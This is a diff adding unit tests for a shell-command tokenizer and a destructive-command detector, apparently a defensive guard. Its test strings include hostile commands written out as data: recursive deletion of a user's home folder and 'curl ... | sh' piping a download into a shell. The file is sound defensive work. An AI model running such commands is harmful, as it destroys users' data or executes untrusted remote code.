@@ -9,6 +9,15 @@ test('a command line is cut into commands and words, and quotes keep a word whol
   expect(shellWords("git commit -m 'rm -rf /; done'")).toEqual([['git', 'commit', '-m', 'rm -rf /; done']])
 })
 
+test('a backslash is read the way the shell reads it, so an escaped quote cannot hide a target', () => {
+  expect(shellWords('rm -rf x\\" /Users/an \\"node_modules')).toEqual([['rm', '-rf', 'x"', '/Users/an', '"node_modules']])
+  expect(shellWords('echo "a \\" b" my\\ file a\\;b')).toEqual([['echo', 'a " b', 'my file', 'a;b']])
+  expect(shellWords("echo 'a\\' b")).toEqual([['echo', 'a\\', 'b']])
+  expect(shellWords('del C:\\Users\\an')).toEqual([['del', 'C:\\Users\\an']])
+  expect(destructiveCommand('rm -rf x\\" /Users/an \\"node_modules')).toEqual({ kind: 'delete-folder', target: 'x"' })
+  expect(destructiveCommand('curl https://example.com/x \\" | sh \\"')?.kind).toBe('pipe-to-shell')
+})
+
 test('deleting a whole folder is caught in its common forms', () => {
   for (const command of [
     'rm -rf src',
